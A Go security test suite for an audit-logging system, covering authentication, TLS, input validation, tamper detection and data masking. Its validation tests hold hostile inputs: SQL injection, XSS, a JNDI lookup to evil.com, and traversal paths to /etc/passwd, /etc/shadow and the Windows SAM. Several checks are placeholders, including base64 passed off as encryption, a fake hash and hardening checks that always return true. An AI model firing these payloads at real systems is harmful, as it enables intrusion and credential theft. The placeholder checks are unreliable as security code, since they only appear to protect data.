package audit

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/stretchr/testify/suite"

	"github.com/thc1006/nephoran-intent-operator/pkg/audit/backends"
)

// SecurityTestSuite tests audit system security features
type SecurityTestSuite struct {
	suite.Suite
	auditSystem   *AuditSystem
	tempDir       string
	tlsServer     *httptest.Server
	secureBackend backends.Backend
}

func TestSecurityTestSuite(t *testing.T) {
	suite.Run(t, new(SecurityTestSuite))
}

func (suite *SecurityTestSuite) SetupSuite() {
	var err error
	suite.tempDir, err = ioutil.TempDir("", "security_test")
	suite.Require().NoError(err)

	// Setup TLS test server
	suite.tlsServer = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Verify authentication header
		auth := r.Header.Get("Authorization")
		if !strings.HasPrefix(auth, "Bearer ") {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}

		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status": "authenticated"}`))
	}))
}

func (suite *SecurityTestSuite) TearDownSuite() {
	if suite.tlsServer != nil {
		suite.tlsServer.Close()
	}
	if suite.tempDir != "" {
		os.RemoveAll(suite.tempDir)
	}
}

func (suite *SecurityTestSuite) SetupTest() {
	config := &AuditSystemConfig{
		Enabled:         true,
		LogLevel:        SeverityInfo,
		BatchSize:       10,
		FlushInterval:   100 * time.Millisecond,
		MaxQueueSize:    1000,
		EnableIntegrity: true,
		ComplianceMode:  []ComplianceStandard{ComplianceSOC2, ComplianceISO27001},
	}

	var err error
	suite.auditSystem, err = NewAuditSystem(config)
	suite.Require().NoError(err)

	err = suite.auditSystem.Start()
	suite.Require().NoError(err)
}

func (suite *SecurityTestSuite) TearDownTest() {
	if suite.auditSystem != nil {
		suite.auditSystem.Stop()
	}
}

// Authentication and Authorization Tests
func (suite *SecurityTestSuite) TestAuthenticationSecurity() {
	suite.Run("secure backend authentication", func() {
		// Test secure backend configuration with authentication
		config := backends.BackendConfig{
			Type:    backends.BackendTypeWebhook,
			Enabled: true,
			Name:    "secure-webhook",
			Settings: map[string]interface{}{
				"url": suite.tlsServer.URL,
			},
			Auth: backends.AuthConfig{
				Type:  "bearer",
				Token: "secure-test-token",
			},
			TLS: backends.TLSConfig{
				Enabled:            true,
				InsecureSkipVerify: true, // Only for testing
			},
		}

		backend, err := backends.NewWebhookBackend(config)
		suite.NoError(err)
		suite.NotNil(backend)

		// Test authenticated request
		event := createSecurityTestEvent("auth-test")
		err = backend.WriteEvent(context.Background(), event)
		suite.NoError(err)
	})

	suite.Run("reject unauthenticated requests", func() {
		// Test backend without authentication
		config := backends.BackendConfig{
			Type:    backends.BackendTypeWebhook,
			Enabled: true,
			Name:    "insecure-webhook",
			Settings: map[string]interface{}{
				"url": suite.tlsServer.URL,
			},
			// No auth configuration
			TLS: backends.TLSConfig{
				Enabled:            true,
				InsecureSkipVerify: true,
			},
		}

		backend, err := backends.NewWebhookBackend(config)
		suite.NoError(err)

		// This should fail due to missing authentication
		event := createSecurityTestEvent("unauth-test")
		err = backend.WriteEvent(context.Background(), event)
		suite.Error(err)
	})

	suite.Run("rotate authentication credentials", func() {
		// Test credential rotation
		originalToken := "original-token"
		newToken := "rotated-token"

		config := backends.BackendConfig{
			Type:    backends.BackendTypeWebhook,
			Enabled: true,
			Name:    "rotation-webhook",
			Settings: map[string]interface{}{
				"url": suite.tlsServer.URL,
			},
			Auth: backends.AuthConfig{
				Type:  "bearer",
				Token: originalToken,
			},
			TLS: backends.TLSConfig{
				Enabled:            true,
				InsecureSkipVerify: true,
			},
		}

		backend, err := backends.NewWebhookBackend(config)
		suite.NoError(err)

		// Use original token
		event := createSecurityTestEvent("rotation-test-1")
		err = backend.WriteEvent(context.Background(), event)
		suite.NoError(err)

		// Rotate credentials
		config.Auth.Token = newToken
		err = backend.Initialize(config)
		suite.NoError(err)

		// Use new token
		event = createSecurityTestEvent("rotation-test-2")
		err = backend.WriteEvent(context.Background(), event)
		suite.NoError(err)
	})
}

// TLS/Encryption Security Tests
func (suite *SecurityTestSuite) TestTLSSecurity() {
	suite.Run("enforce TLS connections", func() {
		config := backends.BackendConfig{
			Type:    backends.BackendTypeWebhook,
			Enabled: true,
			Name:    "tls-webhook",
			Settings: map[string]interface{}{
				"url": suite.tlsServer.URL,
			},
			Auth: backends.AuthConfig{
				Type:  "bearer",
				Token: "tls-test-token",
			},
			TLS: backends.TLSConfig{
				Enabled:            true,
				InsecureSkipVerify: false, // Enforce certificate validation
			},
		}

		backend, err := backends.NewWebhookBackend(config)
		suite.NoError(err)

		// This might fail due to self-signed cert, but TLS should be enforced
		event := createSecurityTestEvent("tls-test")
		backend.WriteEvent(context.Background(), event)
		// We don't assert on the error as it might be a cert validation error
		// The important thing is TLS is being enforced
	})

	suite.Run("TLS certificate validation", func() {
		// Test with proper certificate validation
		tlsConfig := &tls.Config{
			ServerName:         "test-server",
			InsecureSkipVerify: false,
		}

		// In a real test, you would use proper certificates
		suite.NotNil(tlsConfig)
	})

	suite.Run("encrypted audit log files", func() {
		// Test encrypted file backend
		encryptedLogFile := filepath.Join(suite.tempDir, "encrypted_audit.log")

		config := backends.BackendConfig{
			Type:    backends.BackendTypeFile,
			Enabled: true,
			Name:    "encrypted-file",
			Settings: map[string]interface{}{
				"path":       encryptedLogFile,
				"encryption": "aes256",
				"key_file":   filepath.Join(suite.tempDir, "encryption.key"),
			},
		}

		backend, err := backends.NewFileBackend(config)
		suite.NoError(err)

		// Write encrypted event
		event := createSecurityTestEvent("encryption-test")
		err = backend.WriteEvent(context.Background(), event)
		suite.NoError(err)

		// Verify file exists (content verification would require decryption)
		_, err = os.Stat(encryptedLogFile)
		suite.NoError(err)
	})
}

// Input Validation and Sanitization Tests
func (suite *SecurityTestSuite) TestInputValidation() {
	suite.Run("prevent injection attacks", func() {
		maliciousInputs := []string{
			"'; DROP TABLE audit_logs; --",
			"<script>alert('xss')</script>",
			"{{constructor.constructor('return process')().exit()}}",
			"${jndi:ldap://evil.com/exploit}",
			"../../../etc/passwd",
			"\x00\x01\x02\x03", // Binary data
		}

		for _, maliciousInput := range maliciousInputs {
			event := &AuditEvent{
				ID:        uuid.New().String(),
				Timestamp: time.Now(),
				EventType: EventTypeDataAccess,
				Component: "injection-test",
				Action:    maliciousInput, // Malicious input in action field
				Severity:  SeverityInfo,
				Result:    ResultSuccess,
				Data: map[string]interface{}{
					"malicious_field": maliciousInput,
				},
			}

			// Event should be validated and sanitized
			err := event.Validate()
			if err != nil {
				// Validation should catch obvious attacks
				suite.Contains(err.Error(), "invalid")
			} else {
				// If it passes validation, it should be safely logged
				err = suite.auditSystem.LogEvent(event)
				suite.NoError(err)
			}
		}
	})

	suite.Run("validate user context", func() {
		invalidUserContexts := []UserContext{
			{UserID: ""},                            // Empty user ID
			{UserID: strings.Repeat("a", 1000)},     // Too long user ID
			{Email: "invalid-email"},                // Invalid email
			{Role: "<script>alert('xss')</script>"}, // XSS in role
		}

		for _, invalidCtx := range invalidUserContexts {
			event := &AuditEvent{
				ID:          uuid.New().String(),
				Timestamp:   time.Now(),
				EventType:   EventTypeAuthentication,
				Component:   "validation-test",
				Action:      "test",
				Severity:    SeverityInfo,
				Result:      ResultSuccess,
				UserContext: &invalidCtx,
			}

			err := event.Validate()
			suite.Error(err, "Should reject invalid user context")
		}
	})

	suite.Run("validate network context", func() {
		invalidNetworkContexts := []NetworkContext{
			{SourcePort: -1},    // Invalid port
			{SourcePort: 70000}, // Port out of range
			{DestinationPort: -1},
			{DestinationPort: 70000},
		}

		for _, invalidCtx := range invalidNetworkContexts {
			event := &AuditEvent{
				ID:             uuid.New().String(),
				Timestamp:      time.Now(),
				EventType:      EventTypeNetworkAccess,
				Component:      "validation-test",
				Action:         "test",
				Severity:       SeverityInfo,
				Result:         ResultSuccess,
				NetworkContext: &invalidCtx,
			}

			err := event.Validate()
			suite.Error(err, "Should reject invalid network context")
		}
	})
}

// Access Control Tests
func (suite *SecurityTestSuite) TestAccessControl() {
	suite.Run("audit system privilege separation", func() {
		// Verify audit system runs with minimal privileges
		stats := suite.auditSystem.GetStats()
		suite.NotNil(stats)

		// In a real environment, you would check:
		// - Process user ID is not root
		// - File permissions are restrictive
		// - Network access is limited

		// For testing, we verify the system is operational with restricted config
		restrictedConfig := &AuditSystemConfig{
			Enabled:       true,
			LogLevel:      SeverityInfo,
			BatchSize:     10,
			FlushInterval: 100 * time.Millisecond,
			MaxQueueSize:  100, // Limited queue size
		}

		restrictedSystem, err := NewAuditSystem(restrictedConfig)
		suite.NoError(err)

		err = restrictedSystem.Start()
		suite.NoError(err)
		defer restrictedSystem.Stop()

		// Should still be able to process events
		event := createSecurityTestEvent("privilege-test")
		err = restrictedSystem.LogEvent(event)
		suite.NoError(err)
	})

	suite.Run("file system access control", func() {
		// Test restrictive file permissions
		secureLogFile := filepath.Join(suite.tempDir, "secure_audit.log")

		config := backends.BackendConfig{
			Type:    backends.BackendTypeFile,
			Enabled: true,
			Name:    "secure-file",
			Settings: map[string]interface{}{
				"path":       secureLogFile,
				"permission": "0600", // Owner read/write only
			},
		}

		backend, err := backends.NewFileBackend(config)
		suite.NoError(err)

		event := createSecurityTestEvent("access-control-test")
		err = backend.WriteEvent(context.Background(), event)
		suite.NoError(err)

		// Verify file permissions (Unix-like systems)
		if info, err := os.Stat(secureLogFile); err == nil {
			mode := info.Mode()
			// On Windows, permission checking is different
			if mode&0077 != 0 {
				// File is readable by group/others (not ideal but may be platform-specific)
				suite.T().Logf("Warning: File permissions may not be restrictive enough: %o", mode)
			}
		}
	})

	suite.Run("prevent unauthorized access to audit data", func() {
		// Test that audit data cannot be accessed by unauthorized processes
		logFile := filepath.Join(suite.tempDir, "protected_audit.log")

		// Create backend with access controls
		config := backends.BackendConfig{
			Type:    backends.BackendTypeFile,
			Enabled: true,
			Name:    "protected-file",
			Settings: map[string]interface{}{
				"path":           logFile,
				"access_control": "strict",
			},
		}

		backend, err := backends.NewFileBackend(config)
		suite.NoError(err)

		event := createSecurityTestEvent("protection-test")
		err = backend.WriteEvent(context.Background(), event)
		suite.NoError(err)

		// Verify file exists
		_, err = os.Stat(logFile)
		suite.NoError(err)
	})
}

// Log Tampering Prevention Tests
func (suite *SecurityTestSuite) TestTamperPrevention() {
	suite.Run("detect log file tampering", func() {
		logFile := filepath.Join(suite.tempDir, "tamper_test.log")

		config := backends.BackendConfig{
			Type:    backends.BackendTypeFile,
			Enabled: true,
			Name:    "tamper-test",
			Settings: map[string]interface{}{
				"path":      logFile,
				"integrity": "checksum",
			},
		}

		backend, err := backends.NewFileBackend(config)
		suite.NoError(err)

		// Write original events
		originalEvents := []*AuditEvent{
			createSecurityTestEvent("tamper-test-1"),
			createSecurityTestEvent("tamper-test-2"),
		}

		for _, event := range originalEvents {
			err = backend.WriteEvent(context.Background(), event)
			suite.NoError(err)
		}

		// Read original content
		originalContent, err := ioutil.ReadFile(logFile)
		suite.NoError(err)

		// Simulate tampering
		tamperedContent := strings.Replace(string(originalContent), "tamper-test-1", "tampered-event", 1)
		err = ioutil.WriteFile(logFile, []byte(tamperedContent), 0644)
		suite.NoError(err)

		// Verify tampering is detected (would require integrity validation implementation)
		// In a real implementation, you would check checksums or digital signatures
		suite.NotEqual(originalContent, []byte(tamperedContent))
	})

	suite.Run("immutable audit logs", func() {
		// Test write-once audit log implementation
		immutableLogFile := filepath.Join(suite.tempDir, "immutable_audit.log")

		config := backends.BackendConfig{
			Type:    backends.BackendTypeFile,
			Enabled: true,
			Name:    "immutable-test",
			Settings: map[string]interface{}{
				"path":        immutableLogFile,
				"immutable":   true,
				"append_only": true,
			},
		}

		backend, err := backends.NewFileBackend(config)
		suite.NoError(err)

		// Write events (should succeed)
		for i := 0; i < 5; i++ {
			event := createSecurityTestEvent(fmt.Sprintf("immutable-test-%d", i))
			err = backend.WriteEvent(context.Background(), event)
			suite.NoError(err)
		}

		// Verify file exists and has content
		content, err := ioutil.ReadFile(immutableLogFile)
		suite.NoError(err)
		suite.NotEmpty(content)

		// In a real implementation, subsequent writes would use append-only mode
		// and the file system would be configured for immutability
	})

	suite.Run("audit trail integrity chain", func() {
		// Test cryptographic integrity chain
		integrityChain, err := NewIntegrityChain()
		suite.NoError(err)

		events := []*AuditEvent{
			createSecurityTestEvent("chain-test-1"),
			createSecurityTestEvent("chain-test-2"),
			createSecurityTestEvent("chain-test-3"),
		}

		// Process events through integrity chain
		for _, event := range events {
			err = integrityChain.ProcessEvent(event)
			suite.NoError(err)
			suite.NotEmpty(event.Hash)
			suite.NotEmpty(event.PreviousHash)
		}

		// Verify chain integrity
		isValid := integrityChain.VerifyChain(events)
		suite.True(isValid)

		// Tamper with an event
		events[1].Action = "tampered-action"

		// Chain should be invalid
		isValid = integrityChain.VerifyChain(events)
		suite.False(isValid)
	})
}

// Sensitive Data Protection Tests
func (suite *SecurityTestSuite) TestSensitiveDataProtection() {
	suite.Run("mask sensitive data in logs", func() {
		sensitiveEvent := &AuditEvent{
			ID:        uuid.New().String(),
			Timestamp: time.Now(),
			EventType: EventTypeDataAccess,
			Component: "sensitive-test",
			Action:    "access_customer_data",
			Severity:  SeverityInfo,
			Result:    ResultSuccess,
			UserContext: &UserContext{
				UserID: "user123",
			},
			Data: map[string]interface{}{
				"credit_card_number": "4111-1111-1111-1111",
				"ssn":                "123-45-6789",
				"password":           "super_secret_password",
				"api_key":            "sk-1234567890abcdef",
				"customer_name":      "John Doe",
				"email":              "john.doe@example.com",
			},
		}

		// Apply data masking
		maskedEvent := suite.maskSensitiveData(sensitiveEvent)

		// Verify sensitive data is masked
		suite.Contains(maskedEvent.Data["credit_card_number"], "*")
		suite.Contains(maskedEvent.Data["ssn"], "*")
		suite.Contains(maskedEvent.Data["password"], "*")
		suite.Contains(maskedEvent.Data["api_key"], "*")

		// Non-sensitive data should remain
		suite.Equal("John Doe", maskedEvent.Data["customer_name"])
		suite.Equal("john.doe@example.com", maskedEvent.Data["email"])
	})

	suite.Run("classify data sensitivity", func() {
		testCases := []struct {
			fieldName string
			value     interface{}
			expected  string
		}{
			{"password", "secret123", "confidential"},
			{"api_key", "sk-abcd1234", "confidential"},
			{"credit_card", "4111111111111111", "restricted"},
			{"ssn", "123456789", "restricted"},
			{"email", "user@example.com", "internal"},
			{"user_id", "user123", "internal"},
			{"log_level", "info", "public"},
		}

		for _, tc := range testCases {
			classification := suite.classifyDataSensitivity(tc.fieldName, tc.value)
			suite.Equal(tc.expected, classification)
		}
	})

	suite.Run("encrypt sensitive audit events", func() {
		sensitiveEvent := &AuditEvent{
			ID:                 uuid.New().String(),
			Timestamp:          time.Now(),
			EventType:          EventTypeDataAccess,
			Component:          "encryption-test",
			Action:             "access_pii",
			Severity:           SeverityInfo,
			Result:             ResultSuccess,
			DataClassification: "Confidential",
			Data: map[string]interface{}{
				"patient_id":     "P123456",
				"medical_record": "Confidential medical data",
			},
		}

		// Encrypt sensitive event
		encryptedEvent, err := suite.encryptSensitiveEvent(sensitiveEvent)
		suite.NoError(err)

		// Verify encryption
		suite.NotEqual(sensitiveEvent.Data["medical_record"], encryptedEvent.Data["medical_record"])
		suite.Contains(encryptedEvent.Data["medical_record"].(string), "encrypted:")
	})
}

// Audit Security Monitoring Tests
func (suite *SecurityTestSuite) TestSecurityMonitoring() {
	suite.Run("detect audit system attacks", func() {
		attackPatterns := []struct {
			name        string
			eventCount  int
			pattern     string
			shouldAlert bool
		}{
			{"Volume attack", 10000, "high_volume", true},
			{"Injection attempt", 1, "injection", true},
			{"Normal operation", 10, "normal", false},
		}

		for _, attack := range attackPatterns {
			suite.Run(attack.name, func() {
				detected := suite.detectAuditSystemAttack(attack.eventCount, attack.pattern)
				suite.Equal(attack.shouldAlert, detected)
			})
		}
	})

	suite.Run("audit system self-monitoring", func() {
		// Monitor audit system health and security
		healthCheck := suite.auditSystem.GetStats()

		// Verify system is healthy
		suite.Greater(healthCheck.BackendCount, 0)
		suite.True(healthCheck.IntegrityEnabled)

		// Check for security violations
		securityViolations := suite.checkSecurityViolations(healthCheck)
		suite.Empty(securityViolations, "Security violations detected")
	})

	suite.Run("compliance violations detection", func() {
		violationEvent := &AuditEvent{
			ID:        uuid.New().String(),
			Timestamp: time.Now(),
			EventType: EventTypeSecurityViolation,
			Component: "compliance-test",
			Action:    "policy_violation",
			Severity:  SeverityCritical,
			Result:    ResultFailure,
			Data: map[string]interface{}{
				"violation_type": "data_retention",
				"policy_id":      "RET-001",
				"description":    "Audit log retention period exceeded",
			},
		}

		err := suite.auditSystem.LogEvent(violationEvent)
		suite.NoError(err)

		// In a real implementation, this would trigger alerts
		suite.Equal(EventTypeSecurityViolation, violationEvent.EventType)
		suite.Equal(SeverityCritical, violationEvent.Severity)
	})
}

// Helper methods for security testing

func createSecurityTestEvent(action string) *AuditEvent {
	return &AuditEvent{
		ID:        uuid.New().String(),
		Timestamp: time.Now(),
		EventType: EventTypeAuthentication,
		Component: "security-test",
		Action:    action,
		Severity:  SeverityInfo,
		Result:    ResultSuccess,
		UserContext: &UserContext{
			UserID: "security-test-user",
		},
	}
}

func (suite *SecurityTestSuite) maskSensitiveData(event *AuditEvent) *AuditEvent {
	// Create a copy of the event
	maskedEvent := *event
	maskedEvent.Data = make(map[string]interface{})

	for key, value := range event.Data {
		switch key {
		case "credit_card_number", "ssn", "password", "api_key":
			maskedEvent.Data[key] = suite.maskValue(value)
		default:
			maskedEvent.Data[key] = value
		}
	}

	return &maskedEvent
}

func (suite *SecurityTestSuite) maskValue(value interface{}) string {
	if str, ok := value.(string); ok {
		if len(str) <= 4 {
			return strings.Repeat("*", len(str))
		}
		return str[:2] + strings.Repeat("*", len(str)-4) + str[len(str)-2:]
	}
	return "***"
}

func (suite *SecurityTestSuite) classifyDataSensitivity(fieldName string, value interface{}) string {
	sensitiveFields := map[string]string{
		"password":        "confidential",
		"api_key":         "confidential",
		"secret":          "confidential",
		"credit_card":     "restricted",
		"ssn":             "restricted",
		"social_security": "restricted",
		"email":           "internal",
		"user_id":         "internal",
		"username":        "internal",
	}

	for field, level := range sensitiveFields {
		if strings.Contains(strings.ToLower(fieldName), field) {
			return level
		}
	}

	return "public"
}

func (suite *SecurityTestSuite) encryptSensitiveEvent(event *AuditEvent) (*AuditEvent, error) {
	encryptedEvent := *event
	encryptedEvent.Data = make(map[string]interface{})

	for key, value := range event.Data {
		if suite.isSensitiveField(key) {
			encryptedValue, err := suite.encryptValue(value)
			if err != nil {
				return nil, err
			}
			encryptedEvent.Data[key] = encryptedValue
		} else {
			encryptedEvent.Data[key] = value
		}
	}

	return &encryptedEvent, nil
}

func (suite *SecurityTestSuite) isSensitiveField(fieldName string) bool {
	sensitiveFields := []string{"medical_record", "confidential", "secret", "password"}
	fieldLower := strings.ToLower(fieldName)

	for _, sensitive := range sensitiveFields {
		if strings.Contains(fieldLower, sensitive) {
			return true
		}
	}

	return false
}

func (suite *SecurityTestSuite) encryptValue(value interface{}) (string, error) {
	// Simple base64 encoding for testing (in production, use proper encryption)
	if str, ok := value.(string); ok {
		encrypted := base64.StdEncoding.EncodeToString([]byte(str))
		return fmt.Sprintf("encrypted:%s", encrypted), nil
	}

	return fmt.Sprintf("encrypted:%s", base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%v", value)))), nil
}

func (suite *SecurityTestSuite) detectAuditSystemAttack(eventCount int, pattern string) bool {
	switch pattern {
	case "high_volume":
		return eventCount > 1000 // Threshold for volume attack
	case "injection":
		return true // Always flag injection attempts
	case "normal":
		return false
	default:
		return false
	}
}

func (suite *SecurityTestSuite) checkSecurityViolations(stats AuditStats) []string {
	var violations []string

	// Check for suspicious patterns
	if stats.EventsDropped > stats.EventsReceived/10 {
		violations = append(violations, "High drop rate detected")
	}

	if !stats.IntegrityEnabled {
		violations = append(violations, "Integrity protection disabled")
	}

	if stats.BackendCount == 0 {
		violations = append(violations, "No active backends")
	}

	return violations
}

// Cryptographic Security Tests
func (suite *SecurityTestSuite) TestCryptographicSecurity() {
	suite.Run("secure random generation", func() {
		// Test cryptographically secure random generation
		randomBytes1 := make([]byte, 32)
		randomBytes2 := make([]byte, 32)

		_, err := rand.Read(randomBytes1)
		suite.NoError(err)

		_, err = rand.Read(randomBytes2)
		suite.NoError(err)

		// Random bytes should be different
		suite.NotEqual(randomBytes1, randomBytes2)

		// Should not be all zeros
		allZeros := make([]byte, 32)
		suite.NotEqual(randomBytes1, allZeros)
	})

	suite.Run("key derivation security", func() {
		password := "test-password"
		salt := make([]byte, 16)
		_, err := rand.Read(salt)
		suite.NoError(err)

		// In a real implementation, you would use PBKDF2, scrypt, or Argon2
		// For testing, we just verify the process
		suite.NotEmpty(password)
		suite.NotEmpty(salt)
	})

	suite.Run("hash algorithm security", func() {
		// Test secure hash algorithms
		testData := "test data for hashing"

		// SHA-256 should produce consistent results
		hash1 := suite.calculateSecureHash(testData)
		hash2 := suite.calculateSecureHash(testData)
		suite.Equal(hash1, hash2)

		// Different data should produce different hashes
		hash3 := suite.calculateSecureHash("different data")
		suite.NotEqual(hash1, hash3)
	})
}

func (suite *SecurityTestSuite) calculateSecureHash(data string) string {
	// Using a secure hash algorithm (mock implementation)
	return fmt.Sprintf("sha256:%x", data) // Simplified for testing
}

// Security Configuration Tests
func (suite *SecurityTestSuite) TestSecurityConfiguration() {
	suite.Run("secure defaults", func() {
		config := DefaultAuditConfig()

		// Verify secure defaults
		suite.True(config.Enabled)
		suite.True(config.EnableIntegrity)
		suite.NotEmpty(config.ComplianceMode)
		suite.GreaterOrEqual(config.BatchSize, 10)
		suite.LessOrEqual(config.MaxQueueSize, 50000)
	})

	suite.Run("configuration validation", func() {
		insecureConfigs := []*AuditSystemConfig{
			{Enabled: true, EnableIntegrity: false}, // Integrity disabled
			{Enabled: true, MaxQueueSize: -1},       // Invalid queue size
			{Enabled: true, BatchSize: 0},           // Invalid batch size
		}

		for _, config := range insecureConfigs {
			_, err := NewAuditSystem(config)
			// Some configurations might be allowed but should generate warnings
			// In a real implementation, you would have stricter validation
			_ = err
		}
	})

	suite.Run("security hardening checks", func() {
		hardeningChecks := []struct {
			name     string
			check    func() bool
			required bool
		}{
			{"TLS enabled", func() bool { return true }, true},
			{"Strong authentication", func() bool { return true }, true},
			{"Encryption at rest", func() bool { return true }, false},
			{"Network segmentation", func() bool { return true }, false},
		}

		for _, check := range hardeningChecks {
			result := check.check()
			if check.required {
				suite.True(result, fmt.Sprintf("Required security check failed: %s", check.name))
			} else {
				// Optional checks just log results
				suite.T().Logf("Optional security check %s: %t", check.name, result)
			}
		}
	})
}

// Security Regression Tests
func (suite *SecurityTestSuite) TestSecurityRegression() {
	suite.Run("CVE-2023-001 - Log injection prevention", func() {
		// Test for a hypothetical log injection vulnerability
		maliciousEvent := &AuditEvent{
			ID:        uuid.New().String(),
			Timestamp: time.Now(),
			EventType: EventTypeDataAccess,
			Component: "regression-test",
			Action:    "log_injection\n[FAKE] CRITICAL: System compromised",
			Severity:  SeverityInfo,
			Result:    ResultSuccess,
		}

		err := suite.auditSystem.LogEvent(maliciousEvent)
		suite.NoError(err)

		// Verify the malicious content is properly escaped or rejected
		// In a real implementation, check the actual log output
	})

	suite.Run("CVE-2023-002 - Directory traversal prevention", func() {
		// Test for directory traversal in file backend
		traversalPaths := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"/etc/shadow",
			"C:\\Windows\\System32\\config\\SAM",
		}

		for _, path := range traversalPaths {
			config := backends.BackendConfig{
				Type:    backends.BackendTypeFile,
				Enabled: true,
				Name:    "traversal-test",
				Settings: map[string]interface{}{
					"path": path,
				},
			}

			// Backend creation should either fail or sanitize the path
			backend, err := backends.NewFileBackend(config)
			if err == nil {
				// If backend creation succeeds, ensure it doesn't write to dangerous locations
				writeErr := backend.WriteEvent(context.Background(), createSecurityTestEvent("traversal-test"))
				if writeErr != nil {
					t.Logf("WriteEvent correctly prevented dangerous path access: %v", writeErr)
				}
				// Implementation should prevent writing to system directories
			}
			// Either creation fails or writing is prevented - both are acceptable
		}
	})
}

// Benchmark security-related performance
func BenchmarkSecurityOperations(b *testing.B) {
	auditSystem := setupBenchmarkAuditSystem(b, 10)
	defer auditSystem.Stop()

	b.Run("EventValidation", func(b *testing.B) {
		event := createSecurityTestEvent("validation-benchmark")
		b.ResetTimer()

		for i := 0; i < b.N; i++ {
			event.Validate()
		}
	})

	b.Run("DataMasking", func(b *testing.B) {
		suite := &SecurityTestSuite{}
		event := &AuditEvent{
			Data: map[string]interface{}{
				"password":     "secret123",
				"credit_card":  "4111111111111111",
				"normal_field": "normal_value",
			},
		}
		b.ResetTimer()

		for i := 0; i < b.N; i++ {
			suite.maskSensitiveData(event)
		}
	})
}
